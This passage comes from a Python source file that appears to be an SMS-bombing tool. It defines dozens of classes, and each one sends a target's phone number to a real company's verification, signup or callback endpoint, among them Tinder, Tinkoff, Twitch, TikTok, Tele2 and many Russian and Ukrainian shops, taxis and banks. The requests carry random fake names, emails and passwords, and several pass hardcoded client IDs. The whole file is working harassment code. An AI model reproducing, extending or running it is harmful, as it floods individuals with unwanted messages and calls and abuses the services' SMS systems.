            params={"phone": phone},
        )


class Sunlight(Service):
    async def run(self, client, phone):
        return await client.options(
            "https://api.sunlight.net/v3/customers/authorization/"
        )
        return await client.post(
            "https://api.sunlight.net/v3/customers/authorization/",
            data={"phone": phone},
        )


class Sushi33(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": rand_email(),
                "password": rand_password(),
                "phone": phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )


class SushiFuji(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://sushifuji.ru/sms_send_ajax.php",
            data={"name": "false", "phone": phone},
        )


class SushiGourmet(Service):
    async def run(self, client, phone):
        return await client.post(
            "http://sushigourmet.ru/auth",
            data={"phone": format_phone(phone, "8 (***) ***-**-**"), "stage": 1},
        )


class SushiLaguna(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",
            data={"phone": format_phone(phone, "8(***)***-**-**")},
        )


class SushiMaster(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://client-api.sushi-master.ru/api/v1/auth/init",
            json={"phone": phone},
        )


class SushiProfi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.sushi-profi.ru/api/order/order-call/",
            json={"phone": phone, "name": rand_russian_name()},
        )


class SushiVesla(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization",
            json={"phone": format_phone(phone, "+7 *** ***-**-**")},
        )


class Tabasko(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://tabasko.su/",
            data={
                "IS_AJAX": "Y",
                "COMPONENT_NAME": "AUTH",
                "ACTION": "GET_CODE",
                "LOGIN": phone,
            },
        )


class Tabris(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://lk.tabris.ru/reg/",
            data={"action": "phone", "phone": phone},
        )


class Tanuki(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.tanuki.ru/api/",
            json={
                "header": {
                    "version": "2.0",
                    "userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}",
                    "agent": {"device": "desktop", "version": "undefined undefined"},
                    "langId": "1",
                    "cityId": "9",
                },
                "method": {"name": "sendSmsCode"},
                "data": {"phone": "+" + phone, "type": 1},
            },
        )


class TarantinoFamily(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.tarantino-family.com/wp-admin/admin-ajax.php",
            data={"action": "callback_phonenumber", "phone": phone},
        )


class Taxi310(Service):
    async def run(self, client, phone):
        return await client.post(
            "http://62.149.7.19:7200/api/account/register/sendConfirmCode",
            json={"phone": phone},
        )


class TaxiRitm(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": phone},
        )


class Tele2(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://msk.tele2.ru/api/validation/number/" + phone,
            json={"sender": "Tele2"},
        )


class Thehive(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://thehive.pro/auth/signup",
            json={"phone": "+" + phone},
        )


class TikTok(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://m.tiktok.com/node/send/download_link",
            json={
                "slideVerify": 0,
                "language": "en",
                "PhoneRegin": "RU",
                "Mobile": phone,
                "page": {"af_adset_id": 0, "pid": 0},
            },
        )


class Tinder(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
            data={"phone_number": phone},
        )


class Tinkoff(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.tinkoff.ru/v1/sign_up",
            data={"phone": "+" + phone},
        )


class TopBladeBar(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://topbladebar.ru/user_account/ajax.php?do=sms_code",
            data={"phone": format_phone(phone, "8(***)***-**-**")},
        )


class TopShop(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.top-shop.ru/login/loginByPhone/",
            data={"phone": format_phone(phone, "+7 (***) ***-**-**")},
        )


class TvoyaApteka(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",
            data={"tel": "+" + phone, "change_code": 1},
        )


class Twitch(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://passport.twitch.tv/register?trusted_request=true",
            json={
                "birthday": {"day": 11, "month": 11, "year": 1999},
                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                "include_verification_code": True,
                "password": rand_password(),
                "phone_number": phone,
                "username": rand_username(),
            },
        )


class Ubki(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://secure.ubki.ua/b2_api_xml/ubki/auth",
            json={
                "doc": {
                    "auth": {
                        "mphone": "+" + phone,
                        "bdate": "11.11.1999",
                        "deviceid": "00100",
                        "version": "1.0",
                        "source": "site",
                        "signature": "undefined",
                    }
                }
            },
            headers={"Accept": "application/json"},
        )


class Uklon(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://uklon.com.ua/api/v1/account/code/send",
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": phone},
        )
        return await client.post(
            "https://partner.uklon.com.ua/api/v1/registration/sendcode",
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": phone},
        )


class UlybkaRadugi(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://www.r-ulybka.ru/login/ajax.php",
            data={
                "action": "sendcode",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
            },
        )


class Uchidoma(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            },
        )
        return await client.post(
            "https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )


class Utair(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://b.utair.ru/api/v1/login/",
            data={"login": "+" + phone},
        )


class VeziTaxi(Service):
    async def run(self, client, phone):
        return await client.get(
            "https://vezitaxi.com/api/employment/getsmscode",
            params={
                "phone": "+" + phone,
                "city": 561,
                "callback": "jsonp_callback_35979",
            },
        )


class VisaPay(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://pay.visa.ru/api/Auth/code/request",
            json={"phoneNumber": "+" + phone},
        )


class VSK(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://shop.vsk.ru/ajax/auth/postSms/",
            data={"phone": phone},
        )


class WebBankir(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://ng-api.webbankir.com/user/v2/create",
            json={
                "lastName": rand_russian_name(),
                "firstName": rand_russian_name(),
                "middleName": rand_russian_name(),
                "mobilePhone": phone,
                "email": rand_email(),
                "smsCode": "",
            },
        )


class WifiMetro(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://cabinet.wi-fi.ru/api/auth/by-sms",
            data={"msisdn": phone},
            headers={"App-ID": "cabinet"},
        )


class Worki(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.iconjob.co/api/auth/verification_code",
            json={"phone": phone},
        )


class WowWorks(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://api.wowworks.ru/v2/site/send-code",
            json={"phone": phone, "type": 2},
        )


class YandexEda(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://eda.yandex/api/v1/user/request_authentication_code",
            json={"phone_number": "+" + phone},
        )


class Yaponchik(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://yaponchik.net/login/login.php",
            data={
                "login": "Y",
                "countdown": 0,
                "step": "phone",
                "redirect": "/profile/",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
            },
        )


class Youla(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://youla.ru/web-api/auth/request_code",
            data={"phone": phone},
        )


class Zoopt(Service):
    async def run(self, client, phone):
        return await client.post(
            "https://zoopt.ru/api/",
            data={
                "module": "salin.core",
                "class": r"BonusServer\Auth",
                "action": "SendSms",
                "phone": format_phone(phone, "+7 (***) ***-**-**"),
            },
        )
